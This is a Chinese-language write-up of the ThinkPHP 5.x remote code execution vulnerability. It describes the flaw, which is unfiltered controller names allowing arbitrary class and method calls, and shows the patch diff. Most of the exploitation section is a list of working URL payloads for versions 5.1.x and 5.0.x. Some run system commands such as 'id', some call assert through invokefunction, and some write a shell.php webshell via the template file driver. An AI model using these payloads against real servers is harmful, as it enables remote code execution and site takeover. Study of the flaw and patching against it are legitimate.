# ThinkPHP_5.X_全版本任意代码执行


## Affected Version

- ThinkPHP_5.X

## 0x00 源码地址

https://github.com/top-think/framework

## 0x01 搭建环境

phpstudy 2018

windows 10 x64

## 0x02 漏洞原理

控制器过滤不严，结合直接返回类名的代码操作，导致可以用命名空间的方式来调用任意类的任意方法。

**修复代码：**

https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815#diff-b14f70992e6922289d5fea7a43e4f8d3

```
        // 获取控制器名
        $controller = strip_tags($result[1] ?: $this->rule->getConfig('default_controller'));
   -      if (!preg_match('/^[A-Za-z](\w)*$/', $controller)) {
   +      if (!preg_match('/^[A-Za-z](\w|\.)*$/', $controller)) {
            throw new HttpException(404, 'controller not exists:' . $controller);
        }

```
## 0x03 漏洞利用

5.1.x php版本>5.5

```
http://127.0.0.1/index.php?s=index/think\request/input?data[]=phpinfo()&filter=assert

http://127.0.0.1/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()

http://127.0.0.1/index.php?s=index/\think\template\driver\file/write?cacheFile=shell.php&content=<?php%20phpinfo();?>

http://127.0.0.1/index.php?s=index/\think\template\driver\file/write?cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E

s=index/\think\Request/input&filter=phpinfo&data=1

s=index/\think\Request/input&filter=system&data=id

s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E

s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo();?%3E

s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
```

5.0.x php版本>=5.4

```
http://localhost/thinkphp_5.0.22_with_extend/public///index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()

s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
```

## 0x04批量检测

![run_Thinkphp_check](https://raw.githubusercontent.com/SecWiki/CMS-Hunter/master/ThinkPHP/ThinkPHP_5.X_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/run_Thinkphp_check.png)

## 0x05 参考

[[漏洞分析]thinkphp 5.x全版本任意代码执行分析全记录](https://xz.aliyun.com/t/3570)

[【漏洞预警】ThinkPHP5远程代码执行漏洞](https://nosec.org/home/detail/2050.html)
